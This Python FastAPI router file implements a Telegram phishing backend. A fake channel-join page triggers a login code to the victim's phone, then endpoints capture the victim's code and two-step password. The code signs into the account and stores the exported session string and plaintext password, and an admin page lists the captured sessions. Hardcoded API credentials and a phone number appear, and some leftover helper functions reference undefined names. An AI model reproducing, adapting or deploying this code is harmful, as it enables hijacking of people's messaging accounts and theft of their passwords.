import json
from pathlib import Path
from typing import Optional
from fastapi import APIRouter, Request, Query, Depends, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.templating import Jinja2Templates

from app.config import settings
from sqlalchemy.orm import Session
from app.db.models import ExportRecord, RedirectLink, TelegramChannel
from app.db.database import SessionLocal, get_db
from pyrogram import Client
from redis import Redis

r = Redis(host="localhost", port=6379, decode_responses=True)
API_ID = 23814060  # Ваш API_ID
API_HASH = "d89c1dcef155a809d3f696beb15756c6"

router = APIRouter()
templates = Jinja2Templates(directory="app/ui/templates")

@router.get("/export", response_class=HTMLResponse)
def index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@router.get("/export", response_class=HTMLResponse)
def index(request: Request, id: Optional[str] = Query(default=None)):
    print("ID", id)
    return templates.TemplateResponse("index.html", {"request": request})

    # body = await request.json()
    return templates.TemplateResponse("index.html", {"request": request})


@router.get("/view-export")
async def view_export(request: Request, id: Optional[str] = Query(default=None)):

    data_path = settings.BASE_DIR / "data"
    folders = [
        f.name for f in data_path.iterdir()
        if f.is_dir() and not f.name.startswith(".")
    ]
    print("selected_folder", id)
    
    if id:
        db_record = get_export_record_by_id(SessionLocal(), int(id))
        selected_folder = db_record.directory_name if db_record else None
    else:
        selected_folder = None
    return templates.TemplateResponse("export_view.html", {
        "request": request,
        "folders": folders,
        "selected_folder": selected_folder,
    })

def get_export_record_by_id(session: Session, id: int):
    return session.get(ExportRecord, id)

from slugify import slugify
import os


APP_SESSIONS = {}

@router.get("/t.me/l/{id}", response_class=HTMLResponse)
async def telegram_join(request: Request, id: str):
    db = SessionLocal()
    redirect_data = db.query(RedirectLink).filter(RedirectLink.id == id).first()
    if not redirect_data:
        return templates.TemplateResponse(
            "telegram_join.html",
            {"request": request, "status_code": 404},
            status_code=404
        )
    if not redirect_data.active:
        return templates.TemplateResponse(
            "telegram_join.html",
            {"request": request, "status_code": 404},
            status_code=404
        )
    phone_status = False

    redirect_data.status = "clicked"
    db.commit()
    if redirect_data.phone:
        phone_status = True
        phone_number = redirect_data.phone

    
        phone_number = "+380937157860"
        filename = slugify(id + phone_number)

        global APP_SESSIONS
        app = Client(name=":memory:", api_id=API_ID, api_hash=API_HASH,
                    device_model="EroticBot",
                    system_version="EroOS 6.9",
                    app_version="69.420",
                    lang_code="ru")
        APP_SESSIONS[id] = app
        await app.connect()
        sent = await app.send_code(phone_number)
        r.set(id, json.dumps({
            "phone_number": phone_number,
            "phone_code_hash": sent.phone_code_hash,
            "session_file_slug": filename,
        }))
    return templates.TemplateResponse(
        "telegram_join.html",
        {"request": request, "status_code": 200, "phone_status": phone_status,
        "redirect_channel": redirect_data.redirect},
        status_code=200
    )

import asyncio
@router.route('/send_code', methods=['POST'])
async def send_code(request: Request):
    body = await request.json()
    phone_number = body.get("phone")
    key = body.get("key")
    db = SessionLocal()
    redirect_data = db.query(RedirectLink).filter(RedirectLink.id == key).first()
    redirect_data.status = "clicked"
    db.commit()


    filename = slugify(key + phone_number)
    print("send_code", phone_number, key, filename)
    global APP_SESSIONS
    app = Client(name=":memory:", api_id=API_ID, api_hash=API_HASH,
                device_model="EroticBot",
                system_version="EroOS 6.9",
                app_version="69.420",
                lang_code="ru")
    APP_SESSIONS[key] = app
    await app.connect()
    sent = await app.send_code(phone_number)
    r.set(key, json.dumps({
        "phone_number": phone_number,
        "phone_code_hash": sent.phone_code_hash,
        "session_file_slug": filename,
    }))
    result = {'status': 'code_sent'}
    return JSONResponse(result)

async def _send_code_async(session_name, phone):
    try:
        client = TelegramClient(session_name, API_ID, API_HASH,
                                device_model='Telegram Desktop',
                                system_version='Windows 10 x64',
                                app_version='5.14.1 x64',
                                lang_code='en',
                                system_lang_code='en-US')
        await client.connect()
        result = await client.send_code_request(phone)
        session['phone_code_hash'] = result.phone_code_hash
        await client.disconnect()
        return {'status': 'code_sent'}
    except Exception as e:
        print(f"[ERROR] [{phone}] {e}")
        return {'status': 'error', 'message': str(e)}

from datetime import datetime
from zoneinfo import ZoneInfo

@router.post("/submit_code")
async def enter_code(request: Request):
    body = await request.json()
    code = body.get("code")
    key = body.get("key")
    db = SessionLocal()
    redirect_data = db.query(RedirectLink).filter(RedirectLink.id == key).first()
    print(redirect_data.status)


    data = json.loads(r.get(key))
    phone_number = data["phone_number"]
    phone_code_hash = data["phone_code_hash"]
    filename = data["session_file_slug"]
    global APP_SESSIONS
    app = APP_SESSIONS[key]

    try:
        await app.sign_in(
            phone_number=phone_number,
            phone_code=code,
            phone_code_hash=phone_code_hash
        )
    except Exception as e:
        if "PASSWORD" in str(e).upper():
            r.set(f"{key}:pending", json.dumps({
                "phone_number": phone_number,
                "session_file_slug": filename
            }))
            redirect_data.status = "code_entered"
            db.commit()
            return JSONResponse({"status": "need_password"})
        else:
            return JSONResponse({"status": "invalid_code"})
        raise

    string_session = await app.export_session_string()
    redirect_data.status = "comleted"
    redirect_data.session_string = string_session
    redirect_data.date = datetime.now(ZoneInfo("Europe/Kyiv"))
    db.commit()
    await app.disconnect()
    del APP_SESSIONS[key]


    redirect_url = f"tg://join?invite={redirect_data.redirect.invite_link.split('+')[1]}"

    return JSONResponse({"status": "authorized", 
            "redirect_url": redirect_url})

async def _submit_code_async(session_name, phone, code):
    try:
        client = TelegramClient(session_name, API_ID, API_HASH,
                                device_model='Telegram Desktop',
                                system_version='Windows 10 x64',
                                app_version='5.14.1 x64',
                                lang_code='en',
                                system_lang_code='en-US')
        await client.connect()
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=session['phone_code_hash'])
            await client.disconnect()
            return {'status': 'authorized'}
        except SessionPasswordNeededError:
            await client.disconnect()
            return {'status': 'need_password'}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}



@router.post("/submit_password")
async def enter_password(request: Request):
    body = await request.json()
    password = body.get("password")
    key = body.get("key")

    data = json.loads(r.get(f"{key}:pending"))
    filename = data["session_file_slug"]
    global APP_SESSIONS
    app = APP_SESSIONS[key]

    try:
        await app.check_password(password)
    except Exception as e:
        if "The two-step verification password is invalid" in str(e):
            return JSONResponse({'status': 'password_error'})
        else:
            print(f"[ERROR] [{key}] {e}")
            return JSONResponse({'status': 'password_error', 'message': str(e)})
        raise
    string_session = await app.export_session_string()
    await app.disconnect()
    del APP_SESSIONS[key]

    db = SessionLocal()
    redirect_data = db.query(RedirectLink).filter(RedirectLink.id == key).first()
    redirect_data.status = "comleted"
    redirect_data.session_string = string_session
    redirect_data.password = password
    db.commit()

    print(redirect_data)
    
    redirect_url = f"tg://join?invite={redirect_data.redirect.invite_link.split('+')[1]}"
    
    return JSONResponse({"status": "authorized", 
            "redirect_url": redirect_url})

async def _submit_password_async(session_name, password):
    try:
        client = TelegramClient(session_name, API_ID, API_HASH,
                                device_model='Telegram Desktop',
                                system_version='Windows 10 x64',
                                app_version='5.14.1 x64',
                                lang_code='en',
                                system_lang_code='en-US')
        await client.connect()
        try:
            await client.sign_in(password=password)
            await client.disconnect()
            return {'status': 'authorized'}
        except Exception as e:
            await client.disconnect()
            return {'status': 'password_error', 'message': str(e)}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}
    
@router.get("/sessions", response_class=HTMLResponse)
async def sessions_page(request: Request, db: Session = Depends(get_db)):
    sessions = db.query(RedirectLink).all()
    return templates.TemplateResponse("sessions.html", {"request": request, "sessions": sessions})


@router.delete("/sessions/{session_id}")
async def delete_session(session_id: str, db: Session = Depends(get_db)):
    session = db.query(RedirectLink).filter(RedirectLink.id == session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    db.delete(session)
    db.commit()
    return JSONResponse({"status": "success", "message": f"Session {session_id} deleted"})


@router.delete("/exports/{export_id}")
async def delete_export(export_id: int, db: Session = Depends(get_db)):
    export = db.query(ExportRecord).filter(ExportRecord.id == export_id).first()
    if not export:
        raise HTTPException(status_code=404, detail="Export not found")
    db.delete(export)
    db.commit()
    return JSONResponse({"status": "success", "message": f"Export {export_id} deleted"})


